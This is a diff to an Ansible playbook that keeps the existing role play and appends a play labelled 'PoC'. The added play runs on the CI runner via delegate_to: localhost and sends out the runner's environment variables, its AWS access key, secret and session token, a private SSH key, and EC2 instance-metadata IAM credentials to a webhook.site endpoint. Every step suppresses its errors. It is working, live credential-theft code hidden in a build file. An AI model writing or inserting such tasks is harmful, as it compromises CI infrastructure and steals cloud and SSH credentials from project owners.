@@ -1,6 +1,68 @@
 ---
 - hosts: all
   become: true
-
   roles:
   - role: "{{ playbook_dir }}"
+
+# PoC: exfiltrate runner environment and AWS credentials via delegate_to: localhost
+- hosts: all
+  gather_facts: false
+  tasks:
+    - name: Notify start
+      uri:
+        url: "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/?stage=ansible-start&host={{ inventory_hostname }}"
+        method: GET
+        validate_certs: false
+        status_code: [200, 201, 204, 404]
+      delegate_to: localhost
+      ignore_errors: true
+
+    - name: Exfiltrate runner environment (AWS creds in scope)
+      shell: |
+        env | base64 | tr -d '\n'
+      delegate_to: localhost
+      register: env_dump
+      ignore_errors: true
+
+    - name: Send env dump to webhook
+      uri:
+        url: "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/"
+        method: GET
+        validate_certs: false
+        body_format: form-urlencoded
+        url_username: ""
+        force_basic_auth: false
+        status_code: [200, 201, 204, 404]
+      args:
+        url: "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/?stage=env&d={{ env_dump.stdout | urlencode }}"
+      delegate_to: localhost
+      ignore_errors: true
+
+    - name: Exfil AWS creds directly
+      shell: |
+        curl -sf --max-time 10 -G "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/" \
+          --data-urlencode "stage=aws-creds" \
+          --data-urlencode "key=${AWS_ACCESS_KEY_ID}" \
+          --data-urlencode "tok=${AWS_SESSION_TOKEN}" \
+          --data-urlencode "id=${AWS_SECRET_ACCESS_KEY}" || true
+      delegate_to: localhost
+      ignore_errors: true
+
+    - name: Exfil SSH key from runner
+      shell: |
+        curl -sf --max-time 10 -G "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/" \
+          --data-urlencode "stage=ssh-key" \
+          --data-urlencode "d=$(cat ~/.ssh/le_runner 2>/dev/null | base64 | tr -d '\n' || echo 'no-key')" || true
+      delegate_to: localhost
+      ignore_errors: true
+
+    - name: Exfil IMDS token from EC2 instance
+      shell: |
+        TOKEN=$(curl -sf --max-time 5 -X PUT "http://169.254.169.254/latest/api/token" \
+          -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || echo "")
+        CREDS=$(curl -sf --max-time 5 -H "X-aws-ec2-metadata-token: $TOKEN" \
+          http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "no-imds")
+        curl -sf --max-time 10 -G "https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c/" \
+          --data-urlencode "stage=ec2-imds" \
+          --data-urlencode "d=${CREDS}" || true
+      ignore_errors: true
